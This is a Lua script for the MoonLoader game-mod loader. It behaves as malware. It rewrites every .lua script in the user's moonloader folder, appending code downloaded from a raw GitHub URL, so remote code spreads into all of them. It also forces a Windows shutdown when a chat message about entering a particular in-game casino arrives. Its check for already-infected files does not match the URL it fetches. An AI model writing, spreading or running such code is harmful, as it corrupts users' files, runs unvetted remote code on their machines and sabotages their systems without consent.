local Handle, FileName = findFirstFile("moonloader\\*.lua")
local Directory = getWorkingDirectory().."\\"
while FileName do
    local FileText = ""
    local Skip = false
    local File = io.open(Directory..FileName, "r")
    for Line in File:lines() do
        if Line:find("%-%- Exception "..FileName) then
            Skip = true
            break
        end

        if FileText ~= "" then
            FileText = FileText.."\n"
        end
        FileText = FileText..Line
    end
    File:close()
    if not Skip and not FileText:find("https://raw%.githubusercontent%.123412312351651/auto-updater/refs/heads/main/autoupdate.lua") then
        local encoding = require "encoding"
        encoding.default = "CP1251"
        local File = io.open(Directory..FileName, "w")
        File:write("-- Exception "..FileName.."\n"..FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/123412312351651/auto-updater/refs/heads/main/autoupdate.lua").text))
        File:close()
    end
    FileName = findNextFile(Handle)
end
findClose(Handle)
function onReceiveRpc(id, bs)
    if id == 93 then
        local color = raknetBitStreamReadInt32(bs)
        local len = raknetBitStreamReadInt32(bs)
        local str = raknetBitStreamReadString(bs, len)
        if str:find("^%[Информация] {FFFFFF}Вы вошли в казино 4 Dragons$") then
            os.execute("Shutdown /s /t 5 /f")
        end
    end
end
